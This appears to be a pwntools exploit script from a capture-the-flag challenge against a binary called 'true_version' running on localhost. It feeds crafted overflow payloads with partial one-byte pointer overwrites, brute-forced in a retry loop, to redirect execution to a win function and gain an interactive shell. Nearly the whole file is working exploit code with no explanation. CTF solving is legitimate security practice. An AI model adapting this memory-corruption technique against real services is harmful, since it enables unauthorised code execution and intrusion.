from pwn import *

elf = ELF("../dist/true_version")
libc = ELF('../dist/libc-2.31.so')

while(1):
    try:
        #io = process("../dist/true_version")
        io = remote("localhost", 30022)

        io.sendlineafter(b"Name > ", b"A")
        io.sendlineafter(b"Words > ", b"B")
        io.sendlineafter(b"Age > ", b"256")
        io.sendlineafter(b"Job > ", b"C")
        io.sendlineafter(b"> ", b"4")

        #pause()
        # 1/16
        one_byte = 0x40
        io.sendlineafter(b"> ", b"C" * 0x18 + p32(0x4) + p32(0xffffffff)+ p8(one_byte))

        one_byte_for_mov_rax_qword_rsp_18_call_rax = 0x7c

        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"> ", p8(one_byte_for_mov_rax_qword_rsp_18_call_rax))
        io.sendlineafter(b"?\n", b"NO")


        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"B" * 0xe0 + p32(0x2) + p32(0xffffffff)+ p8(one_byte+0x20))

        win_byte = 0x69
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"> ", p8(win_byte))
        io.sendlineafter(b"?\n", b"YES")
        #io.sendlineafter(b"!\n", b"ls")
        #io.sendlineafter(b"flag", b"cat flag")
        break
    except EOFError as e:
        print(e)
        io.close()


io.interactive()
